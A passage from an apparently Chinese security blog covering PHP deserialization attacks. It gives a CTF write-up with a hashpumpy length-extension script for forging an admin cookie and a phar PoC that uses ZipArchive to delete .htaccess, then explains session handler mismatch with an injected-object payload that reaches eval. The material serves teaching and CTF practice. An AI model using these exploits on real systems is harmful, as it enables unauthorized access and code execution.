<p>看到了关键代码。调用了$this-&gt;checker,如果不为True，就输出不是admin</p>
<p>继续追踪代码profile类中的is_admin函数</p>
<p>接着往下看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_admin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable">$secret</span> = <span class="string">&quot;********&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password != <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$this</span>-&gt;username.<span class="variable">$this</span>-&gt;password))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到。将我们之前登陆的用户名密码赋值给username和password<br>
然后定义了一个密钥。<br>
判断我们之前输出的用户名是不是admin。密码不能是admin<br>
然后将密钥和用户名密码拼接。MD5加密。将加密结果和cookies[‘user’]进行比较<br>
这里我们有三个可控点。用户名+密码+cookies[‘user’]</p>
<p>这里可以先使用hash拓展攻击，写个hashpump脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">sign = <span class="string">&#x27;52107b08c0f3342d2153ae1d68e6262c&#x27;</span> <span class="comment">#从cookie中获得</span></span><br><span class="line">param=<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">sign,add_data = hashpumpy.hashpump(sign,<span class="string">&#x27;adminadmin&#x27;</span>,<span class="string">&#x27;123&#x27;</span>,<span class="number">8</span>) <span class="comment">#登录时密码为123，用户名为admin,admin+123长度为8</span></span><br><span class="line">add_data = add_data[<span class="built_in">len</span>(param):]</span><br><span class="line"><span class="built_in">print</span>(sign)</span><br><span class="line"><span class="built_in">print</span>(add_data)</span><br><span class="line"><span class="built_in">print</span>(urllib.parse.quote(add_data))</span><br></pre></td></tr></table></figure>
<p>获得<code>admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00123</code></p>
<p>再添加一个名为user的cookie，值为4b2928c6b562e5e4dbd35df611b46487<br>
用新的密码重新登录，正常登录之后上传文件能够显示正常路径。</p>
<p>随便上传一个php文件可以发现存在一个.htaccess文件，使得上传的php文件无法解析<br>
存在一个检测上传文件mime类型的功能，猜测存在phar反序列化,看看config.php中的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_detail</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&#x27;</span>, <span class="variable">$this</span>-&gt;filepath))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$mine</span> = <span class="title function_ invoke__">mime_content_type</span>(<span class="variable">$this</span>-&gt;filepath);</span><br><span class="line">        <span class="variable">$store_path</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;filepath);</span><br><span class="line">        <span class="variable">$res</span>[<span class="string">&#x27;mine&#x27;</span>] = <span class="variable">$mine</span>;</span><br><span class="line">        <span class="variable">$res</span>[<span class="string">&#x27;store_path&#x27;</span>] = <span class="variable">$store_path</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>使用了mime_content_type函数来检测文件mime类型</p>
<p>寻找利用链</p>
<p>首先寻找__destruct方法，只有一个</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//config.php File类</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;checker))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">upload_file</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>Admin类存在upload_file方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;u r not admin&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_check -&gt; <span class="title function_ invoke__">check</span>();</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$tmp</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;size &gt; <span class="number">204800</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;your file is too big&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$this</span>-&gt;file_tmp, <span class="variable">$this</span>-&gt;upload_dir.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;filename).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$ext</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>发现Profile类存在一个__call方法、</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//__call会在在调用的方法不存在时会自动调用</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>Profile类不存在upload_file方法，因此把checker车位Profile类的话就会调用这个__call函数<br>
接下来的问题就是要找到一个具有open方法的类</p>
<p><strong>使用ZipArchive::open删除.htaccess</strong></p>
<p>最后的poc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;script language=&quot;php&quot;&gt;__HALT_COMPILER();&lt;/script&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$admin</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;checker=<span class="variable">$admin</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin=<span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;/var/www/html/sandbox/1050a6a70986f01594e231dadd01f541/.htaccess&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = ZIPARCHIVE::<span class="variable constant_">OVERWRITE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$admin</span> = <span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="variable">$admin</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码很简单。准备两个类。然后将需要用到的变量赋值。生成phar就好了<br>
上传phar.phar，然后通过view.php触发。</p>
<h3 id="session反序列化"><a class="markdownIt-Anchor" href="#session反序列化"></a> Session反序列化</h3>
<p>该节内容摘抄自<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/324519.html">PHP session反序列化漏洞原理解析 - FreeBuf网络安全行业门户</a>，session反序列化的实用性还是蛮强的，harden3师傅写的很细~</p>
<h4 id="什么是session"><a class="markdownIt-Anchor" href="#什么是session"></a> 什么是session</h4>
<p>官方<code>Session</code>定义：在计算机中，尤其是在网络应用中，称为“会话控制”。<code>Session</code>对象存储特定用户会话所需的属性及配置信息。主要有以下特点：</p>
<blockquote>
<p><code>session</code>保存的位置是在服务器端</p>
<p><code>session</code>通常是要配合<code>cookie</code>使用</p>
</blockquote>
<p>因为HTTP的无状态性，服务端产生了<code>session</code>来标识当前的用户状态</p>
<p>本质上，<code>session</code>就是一种可以维持服务器端的数据存储技术。即**<code>session</code>技术就是一种基于后端有别于数据库的临时存储数据的技术**</p>
<h4 id="php-session工作流程"><a class="markdownIt-Anchor" href="#php-session工作流程"></a> PHP session工作流程</h4>
<p>以PHP为例，理解<code>session</code>的原理</p>
<ol>
<li>PHP脚本使用 session_start()时开启<code>session</code>会话，会自动检测<code>PHPSESSID</code>
<ul>
<li>如果<code>Cookie</code>中存在，获取<code>PHPSESSID</code></li>
<li>如果<code>Cookie</code>中不存在，创建一个<code>PHPSESSID</code>，并通过响应头以<code>Cookie</code>形式保存到浏览器</li>
</ul>
</li>
<li>初始化超全局变量<code>$_SESSION</code>为一个空数组</li>
<li>PHP通过<code>PHPSESSID</code>去指定位置（<code>PHPSESSID</code>文件存储位置）匹配对应的文件
<ul>
<li>存在该文件：读取文件内容（通过反序列化方式），将数据存储到<code>$_SESSION</code>中</li>
<li>不存在该文件： session_start()创建一个<code>PHPSESSID</code>命名文件</li>
</ul>
</li>
<li>程序执行结束，将<code>$_SESSION</code>中保存的所有数据序列化存储到<code>PHPSESSID</code>对应的文件中</li>
</ol>
<p>具体原理图：</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988659_622b0d7380818dab56a63-166727395787419.jpeg" alt="img"></p>
<h4 id="phpini-session配置"><a class="markdownIt-Anchor" href="#phpini-session配置"></a> php.ini session配置</h4>
<p><code>php.ini</code>里面有较重要的<code>session</code>配置项</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=&quot;/tmp&quot;      --设置session文件的存储位置</span><br><span class="line">session.save_handler=files    --设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数</span><br><span class="line">session.auto_start= 0          --指定会话模块是否在请求开始时启动一个会话，默认值为 0，不启动</span><br><span class="line">session.serialize_handler= php --定义用来序列化/反序列化的处理器名字，默认使用php  </span><br><span class="line">session.upload_progress.enabled= On --启用上传进度跟踪，并填充$ _SESSION变量，默认启用</span><br><span class="line">session.upload_progress.cleanup= oN --读取所有POST数据（即完成上传）后立即清理进度信息，默认启用</span><br></pre></td></tr></table></figure>
<h4 id="php-session序列化机制"><a class="markdownIt-Anchor" href="#php-session序列化机制"></a> PHP session序列化机制</h4>
<p>根据<code>php.ini</code>中的配置项，我们研究将<code>$_SESSION</code>中保存的所有数据序列化存储到<code>PHPSESSID</code>对应的文件中，使用的三种不同的处理格式，即<code>session.serialize_handler</code>定义的三种引擎：</p>
<table>
<thead>
<tr>
<th style="text-align:center">处理器</th>
<th style="text-align:center">对应的存储格式</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">php</td>
<td style="text-align:center">键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td style="text-align:center">php_binary</td>
<td style="text-align:center">键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td style="text-align:center">php_serialize (php&gt;=5.5.4)</td>
<td style="text-align:center">经过 serialize() 函数反序列处理的数组</td>
</tr>
</tbody>
</table>
<h4 id="php处理器"><a class="markdownIt-Anchor" href="#php处理器"></a> php处理器</h4>
<p>首先来看看默认<code>session.serialize_handler = php</code>时候的序列化结果，代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];</span><br><span class="line">echo $_SESSION[&#x27;name&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988663_622b0d779748192aba6f7-166727395787420.jpeg" alt="img"></p>
<p>为了方便查看，将<code>session</code>存储目录设置为<code>session.save_path = &quot;/www/php_session&quot;</code>，<code>PHPSESSID</code>文件如下</p>
<p>1、文件名</p>
<p>文件名为<code>sess_mpnnbont606f50eb178na451od</code>，其中<code>mpnnbont606f50eb178na451od</code>就是后续请求头中<code>Cookie</code>携带的<code>PHPSESSID</code>的值 (如上图浏览器中已存储)</p>
<p>2、文件内容</p>
<p>php处理器存储格式</p>
<table>
<thead>
<tr>
<th style="text-align:center">键名</th>
<th style="text-align:center">竖线</th>
<th style="text-align:center">经过 serialize() 函数反序列处理的值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">$_SESSION[‘name’]的键名：name</td>
<td style="text-align:center">|</td>
<td style="text-align:center">s:6:“harden”;</td>
</tr>
</tbody>
</table>
<h4 id="php_binary处理器"><a class="markdownIt-Anchor" href="#php_binary处理器"></a> php_binary处理器</h4>
<p>使用php_binary处理器，即<code>session.serialize_handler = php_binary</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);</span><br><span class="line">session_start();</span><br><span class="line"># 为了方便ACSII显示，将键名设置为36个字符长度</span><br><span class="line">$_SESSION[&#x27;namenamenamenamenamenamenamenamename&#x27;] = $_GET[&#x27;name&#x27;];</span><br><span class="line">echo $_SESSION[&#x27;namenamenamenamenamenamenamenamename&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>由于三种方式<code>PHPSESSID</code>文件名都是一样的，这里只需要查看文件内容</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988665_622b0d79304714550f427-166727395787421.jpeg" alt="img"></p>
<table>
<thead>
<tr>
<th style="text-align:center">键名的长度对应的 ASCII 字符</th>
<th style="text-align:center">键名</th>
<th style="text-align:center">经过 serialize() 函数反序列处理的值.</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">$</td>
<td style="text-align:center">namenamenamenamenamenamenamenamename</td>
<td style="text-align:center">s:6:“harden”;</td>
</tr>
</tbody>
</table>
<h4 id="php_serialize-处理器"><a class="markdownIt-Anchor" href="#php_serialize-处理器"></a> php_serialize 处理器</h4>
<p>使用php_binary处理器，即<code>session.serialize_handler = php_serialize</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];</span><br><span class="line">echo $_SESSION[&#x27;name&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>文件内容即经过 serialize() 函数反序列处理的数组，<code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;harden&quot;;&#125;</code></p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988666_622b0d7a2a04733d2da9c-166727395787422.jpeg" alt="img"></p>
<h4 id="session的反序列化漏洞利用"><a class="markdownIt-Anchor" href="#session的反序列化漏洞利用"></a> session的反序列化漏洞利用</h4>
<p>session的反序列化漏洞，就是利用<code>php</code>处理器和<code>php_serialize</code>处理器的存储格式差异而产生，通过具体的代码我们来看下漏洞出现的原因</p>
<h4 id="漏洞成因"><a class="markdownIt-Anchor" href="#漏洞成因"></a> 漏洞成因</h4>
<p>首先创建<code>session.php</code>，使用<code>php_serialize</code>处理器来存储session数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">echo $_SESSION[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><code>test.php</code>，使用默认<code>php</code>处理器来存储session数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">class f4ke&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">      echo &quot;Who are you?&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">      eval($this-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$str = new f4ke();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>接着，我们构建URL进行访问<code>session.php</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.session-serialize.com/session.php?session=|O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988667_622b0d7b189aa37924788-166727395787423.jpeg" alt="img"></p>
<p>打开<code>PHPSESSID</code>文件可看到序列化存储的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;session&quot;;s:45:&quot;|O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988668_622b0d7c24506b56b24cc-166727395787424.jpeg" alt="img"></p>
<p>漏洞分析：</p>
<blockquote>
<p>在<code>session.php</code>程序执行，我们将<code>|O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code>通过<code>php_serialize</code>处理器序列化保存成<code>PHPSESSID</code>文件；</p>
<p>由于浏览器中保存的<code>PHPSESSID</code>文件名不变，当我们访问<code>test.php</code>，<code>session_start();</code>找到<code>PHPSESSID</code>文件并使用<code>php</code>处理器反序列化文件内容，识别格式即</p>
<table>
<thead>
<tr>
<th style="text-align:center">键名</th>
<th style="text-align:center">竖线</th>
<th style="text-align:center">经过 serialize() 函数反序列处理的值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">a:1:{s:7:“session”;s:45:&quot;</td>
<td style="text-align:center">|</td>
<td style="text-align:center">O:4:“f4ke”:1:{s:4:“name”;s:10:“phpinfo();”;}</td>
</tr>
</tbody>
</table>
<p>php处理器会以|作为分隔符，将<code>O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code>反序列化，就会触发<code>__wakeup()</code>方法，最后对象销毁执行<code>__destruct()</code>方法中的<code>eval()</code>函数，相当于执行如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&#x27;session&#x27;] = new f4ke();</span><br><span class="line">$_SESSION[&#x27;session&#x27;]-&gt;name = &#x27;phpinfo();&#x27;;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>我们访问<code>test.php</code>，即可直接执行<code>phpinfo()</code>函数</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988669_622b0d7d70e697142e89d-166727395787425.jpeg" alt="img"></p>
<h4 id="ctf例题phpinfo"><a class="markdownIt-Anchor" href="#ctf例题phpinfo"></a> CTF例题：PHPINFO</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">题目地址：http://web.jarvisoj.com:32784/index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//A webshell is wait for you</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz = &#x27;phpinfo();&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;phpinfo&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = new OowoO();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(&#x27;index.php&#x27;));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
